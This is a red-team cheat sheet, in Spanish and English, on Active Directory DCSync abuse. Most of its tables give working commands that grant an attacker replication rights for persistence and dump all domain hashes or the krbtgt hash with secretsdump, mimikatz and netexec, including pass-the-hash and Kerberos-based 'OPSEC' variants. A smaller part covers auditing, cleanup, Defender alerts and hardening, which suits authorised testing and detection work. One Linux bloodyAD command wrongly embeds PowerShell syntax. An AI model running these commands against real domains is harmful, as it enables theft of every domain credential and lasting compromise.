---
aliases:
  - DCSync Tooling
  - Mimikatz dcsync
  - lsadump dcsync
tags:
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
  - "[[Information Gathering]]"
tertiary categories:
  - "[[Active Directory Enumeración]]"
kind: SubCheatSheet
linked:
  - "[[AD - DCSync Rights Discovery]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
  - "[[secretsdump]]"
---
# AD - DCSync Rights Discovery - Tooling

---

## RSAT / PowerShell

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:$((Get-ADDomain).DistinguishedName)"` | DACL del domain root | Audit. |
| `(Get-Acl ...).Access \| ? ObjectType -in (DCSync GUIDs)` | Filter DCSync | Standard. |
| `Add-ADObject` con SD modify (priv) | Add DCSync ACE | Privesc step / hardening. |
^ad-dcsynctool-rsat

---

## PowerView (Adversary)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainObjectAcl -Identity (Get-Domain).DistinguishedName -ResolveGUIDs \| ? ObjectAceType -match "Replicating-Directory"` | DCSync ACEs decoded | Standard. |
| `Add-DomainObjectAcl -TargetIdentity $((Get-Domain).DistinguishedName) -PrincipalIdentity <atacante> -Rights DCSync` | Grant DCSync (priv) | Persistence. |
| `Remove-DomainObjectAcl ... -Rights DCSync` | Cleanup | Post-engagement. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectAceType -match "Replicating-Directory"` | Bulk hunt | Forest-wide. |
^ad-dcsynctool-powerview

---

## BloodHound / SharpHound

| **Comando / Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c ACL,Container,Group` | Captures DCSync ACEs | Targeted stealth. |
| `SharpHound.exe -c DCOnly` | DC-side only (incluye DCSync) | Stealth máximo. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux | Linux. |
| `MATCH (u)-[r:GetChanges\|GetChangesAll\|DCSync]->(d:Domain) RETURN u,d` | Visualización | Audit. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(d:Domain)) WHERE any(r IN relationships(p) WHERE type(r) IN ["GetChanges","GetChangesAll","DCSync"]) RETURN p` | Privesc paths | Standard. |
^ad-dcsynctool-bh

---

## bloodyAD (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass get object "$((Get-ADDomain).DistinguishedName)" --resolve-sd \| grep -E "GetChanges\|Replication"` | DACL filter Linux | Linux audit. |
| `bloodyAD --host <DC> -d corp -u u -p pass add dcsync <atacante>` | Grant DCSync (priv) | Persistence Linux. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove dcsync <atacante>` | Cleanup Linux | Post-engagement. |
^ad-dcsynctool-bloodyad

```bash
# Quick DCSync audit Linux
bloodyAD --host <DC> -d corp -u auditor -p 'Pass!' \
  get object "DC=corp,DC=local" --resolve-sd |
  grep -E "GetChanges|Replication-"
```

---

## DCSync Execution Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc` | Linux full dump | Standard Linux. |
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc-user <victim>` | Single user | Targeted. |
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc -hashes :<NT>` | PtH auth | Sin password. |
| `secretsdump.py 'corp.local/atacante'@<DC> -k -no-pass -just-dc` | Kerberos auth (TGT) | OPSEC. |
| `mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt` | Single user Windows | Standard Windows. |
| `mimikatz: lsadump::dcsync /domain:corp.local /all /csv` | Full dump CSV | Bulk Windows. |
| `nxc smb <DC> -u u -p p --ntds drsuapi` | Auto DCSync via netexec | Quick. |
| `nxc smb <DC> -u u -p p --ntds drsuapi -k` | Kerberos auth | OPSEC. |
| `crackmapexec smb <DC> -u u -p p --ntds vss` | NTDS via VSS (sin DCSync) | Alternativa. |
^ad-dcsynctool-execution

```bash
# OPSEC pipeline
# 1. Get TGT (Kerberos auth)
getTGT.py corp.local/atacante:pass

# 2. DCSync con TGT
KRB5CCNAME=atacante.ccache secretsdump.py -k -no-pass corp.local/atacante@<DC> -just-dc-user krbtgt

# 3. Cleanup (post-engagement)
# Remove DCSync ACE si lo agregaste tu
```

---

## Linux / Impacket Helpers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump` | Standard DCSync | Linux. |
| `impacket-getTGT` | Get TGT pre-DCSync | OPSEC. |
| `dacledit.py corp.local/u:p -dc-ip <DC> -principal <atacante> -target "DC=corp,DC=local" -rights DCSync -action write` | Grant DCSync ACE Linux | Persistence. |
| `dacledit.py ... -action read` | Audit DACL Linux | Standard. |
| `dacledit.py ... -action remove` | Cleanup | Post-engagement. |
^ad-dcsynctool-linux

---

## Microsoft Defender for Identity

| **Alert** | **Trigger** | **Cuándo** |
|:---:|:---:|:---:|
| `Suspected DCSync attack (replication of directory services)` | Replication request from non-DC source | Real-time. |
| `Suspicious LDAP query against AD` | Bulk DACL queries (recon) | Pre-DCSync hunt. |
| `Unusual access to sensitive AD attributes` | Access patterns anómalos | Adjacent. |
^ad-dcsynctool-defender

**Defender side hardening:**
1. Enable SACL en domain root (Event 4662 logging).
2. MDI sensor en todos DCs.
3. Alert rule: Event 4662 con DCSync GUID **donde source IP no es DC**.
4. Honey-token DCSync (cuenta señuelo con DCSync ACE → alerta inmediata).

---

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Microsoft DCSync replication docs | `https://learn.microsoft.com/openspecs/windows_protocols/ms-drsr/` |
| Sean Metcalf — DCSync deep dive | `https://adsecurity.org/?p=1729` |
| Impacket secretsdump | `https://github.com/fortra/impacket/blob/master/examples/secretsdump.py` |
| HackTricks DCSync | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync` |
| The Hacker Recipes — DCSync | `https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync` |
| BloodHound DCSync edge docs | `https://bloodhound.specterops.io/resources/edges/dcsync` |
| MITRE ATT&CK T1003.006 | `https://attack.mitre.org/techniques/T1003/006/` |
| MDI alert ref | `https://learn.microsoft.com/defender-for-identity/credential-access-alerts` |
^ad-dcsynctool-resources

---
